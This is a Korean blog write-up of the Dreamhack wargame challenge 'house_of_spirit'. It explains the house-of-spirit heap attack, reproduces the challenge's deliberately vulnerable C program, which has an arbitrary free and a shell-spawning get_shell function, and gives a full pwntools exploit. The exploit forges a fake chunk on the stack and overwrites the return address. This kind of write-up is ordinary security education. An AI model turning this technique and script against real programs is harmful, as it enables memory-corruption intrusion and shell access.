---
published: true
image: /img
layout: post
title: "[Dreamhack] PWN house_of_spirit"
excerpt: "드림핵 포너블 house_of_spirit 문제풀이"
tags: [Dreamhack, pwnable, wargame, writeup]
math: true
date: 2023-02-26 15:00
---

얼떨결에 도전해본 4단계 문제이다. 취약점 이름은 제목과 같이 house_of_spirit 공격에 관한 내용이다. 문제를 보면 해당 취약점이 어떤 방식으로 터지는지에 대한 설명이 링크로 주어진다. [https://learn.dreamhack.io/16#96](https://learn.dreamhack.io/16#96)

해당 취약점을 간단히 설명하면, free함수는 할당된 메모리를 해제하는 함수이다. free함수를 통해 해제된 청크는 fastbin의 규칙 때문에 취약점으로 이어질수 있다. 가령 0x30의 메모리를 free하면 해당 청크는 fastbin 규약에 따라 메모리에서 해제된다. 해제된 메모리 정보를 tcache_entry에 저장한다. 이후 다시 0x30의 메모리를 할당 받으면 다른 힙 청크에서 일부를 할당하는 것이 아닌 tcache_entry에 등록되어 있는 동일한 사이즈의 청크를 이용하게 된다. 해당 취약점은 변수의 메모리 주소를 알고있다는 가정 하에 실제 청크의 형식을 변수 메모리에 구성하고 이를 해제 후 제 할당함으로 써 할당한 청크에 값을 쓰면 스택 영역을 덮어 씌울 수 있다.

해당 문제의 소스코드는 다음과 같다.
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char *ptr[10];

void alarm_handler() {
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void get_shell() {
	execve("/bin/sh", NULL, NULL);
}

int main() {
	char name[32];
	int idx, i, size = 0;
	long addr = 0;

	initialize();
	memset(name, 0, sizeof(name));
	printf("name: ");
	read(0, name, sizeof(name)-1);

	printf("%p: %s\n", name, name);
	while(1) {
		printf("1. create\n");
		printf("2. delete\n");
		printf("3. exit\n");
		printf("> ");

		scanf("%d", &idx);

		switch(idx) {
			case 1:
				if(i > 10) {
					return -1;
				}
				printf("Size: ");
				scanf("%d", &size);

				ptr[i] = malloc(size);

				if(!ptr[i]) {
					return -1;
				}
				printf("Data: ");
				read(0, ptr[i], size);
				i++;
				break;
			case 2:
				printf("Addr: ");
				scanf("%ld", &addr);

				free(addr);
				break;
			case 3:
				return 0;
			default: 
				break;
		}
	}

	return 0;
}
```

바이너리의 진행 구조는 다음과 같다.
```
이름 입력 -> 이름 메모리 주소 출력 -> 각 매뉴에 따라 1번은 malloc을 통한 메모리 할당 -> 2번을 통해 free를 이용한 메모리 해제 -> 3번을 통해 return을 호출 후 종료
```

이름을 입력한 메모리의 주소를 알수 있다는 것이 매우 유효하다. 이 주소는 스택 영역에 있으며 이를 이용해 가짜 청크를 구성하고 해제한 가짜 청크만큼 다시 할당해 return영역을 덮어쓰면 익스플로잇에 성공할 것 같다.

문제를 풀기전에 청크의 구조를 알아보자.
```
     ________________________________
    |   prev_size   |      size      |   <- header[prev_size + size의 값이
    |--------------------------------|            32비트의 경우 8바이트(4 + 4),
    |                                |            64비트의 경우 16바이트(8 + 8)]
    |                                |
    |              data              |   <- 할당한 데이터 영역의 크기
    |                                |
    |                                |
    |________________________________|
```
위처럼 구조가 나열되어 있으며 64비트 환경에서 0x32크기의 힙을 할당받으면 해더 영역 0x10 과 데이터 영역 0x32가 더해진 0x42가 해더의 size에 쓰인다. prev_size는 이전 청크의 크기 값이다.


이 정보를 바탕으로 name 변수에 가짜 청크를 구성해보자. 헤더 영역만 잘 맞춰주면 free 함수가 청크로 인식해 사이즈 만큼 해제할 수 있을 것이다. prev_size는 0을 8바이트 만큼 넣고 size를 0x50만큼 입력한다. 이후 출력된 메모리 주소를 free 한다. 다만 힙을 한번 할당 해야지 tcache가 생성되므로 임의 크기의 힙을 한번 할당한다. 이후 출력된 메모리 주소 + 0x10의 주소를 free하면 name변수 주소로 청크가 0x50만큼 할당된다. 이후 임의 데이터로 채우고 return 주소가 들어있는 부분에 get_shell() 함수 주소를 넣으면 익스플로잇 할수 있다.

익스플로잇 코드는 다음과 같다.
```python
from pwn import *
context.update(arch='amd64', os='linux')

p = remote("host3.dreamhack.games", 9817);
#p = process("./oneshot", env={'LD_PRELOAD':'./libc.so.6'})
#p = process("./house_of_spirit")
#libc=ELF('./libc.so.6')

data = p64(0)+p64(0x50)
print(data)

p.sendafter(b"name: ", data)

leak = int(p.recvuntil(b":")[:-1], 16)
print(f"leak data : {hex(leak)}")

free_ptr = leak+0x10
print(f"free ptr : {hex(free_ptr)}")

p.sendlineafter(b"> ", str(1))
p.sendlineafter(b"Size: ", str(64))
p.sendlineafter(b"Data: ", b"A"*64)

p.sendlineafter(b"> ", str(2))
p.sendlineafter(b"Addr: ", str(free_ptr))

payload = b"A"*40+p64(0x400940)

p.sendlineafter(b"> ", str(1))
p.sendlineafter(b"Size: ", str(64))
p.sendlineafter(b"Data: ", payload)

pause()

p.sendlineafter(b"> ", str(3))

p.interactive()
```